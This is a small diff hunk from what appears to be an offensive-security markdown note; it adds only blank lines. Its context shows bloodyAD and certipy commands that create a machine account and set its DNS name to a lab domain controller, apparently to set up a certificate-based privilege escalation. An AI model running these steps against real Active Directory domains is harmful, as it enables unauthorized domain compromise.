@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:10.277684+00:00'
 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
 certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
 ```
+
+
